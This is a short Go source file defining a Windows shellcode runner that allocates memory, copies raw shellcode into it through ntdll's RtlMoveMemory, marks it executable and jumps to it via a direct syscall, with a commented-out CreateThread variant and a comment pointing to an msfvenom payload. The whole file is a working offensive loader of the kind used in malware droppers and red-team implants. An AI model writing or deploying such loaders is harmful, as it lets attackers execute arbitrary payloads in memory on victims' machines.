package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func ShellcodeRunner(sc []byte) error {
	//msfvenom  -f hex -p windows/x64/exec cmd=calc
	fmt.Println("----> Run shellcode <----")
	fmt.Println("[+] Allocating memory for shellcode")
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return fmt.Errorf("[FATAL] VirtualAlloc Failed: %v\n", err)
	}
	fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)

	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")

	procrtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	fmt.Println("[+] Wrote shellcode bytes to destination address")

	fmt.Println("[+] Changing Permissions to RX")
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		return fmt.Errorf("[FATAL] VirtualProtect Failed: %v", err)
	}

	/*modKernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateThread := modKernel32.NewProc("CreateThread")
	tHandle, _, lastErr := procCreateThread.Call(
		uintptr(0),
		uintptr(0),
		addr,
		uintptr(0),
		uintptr(0),
		uintptr(0))

	if tHandle == 0 {
		return fmt.Errorf("Unable to Create Thread: %v\n", lastErr)
	}

	fmt.Printf("[+] Handle of newly created thread:  %x \n", tHandle)
	windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)*/
	syscall.SyscallN(addr)
	return nil
}
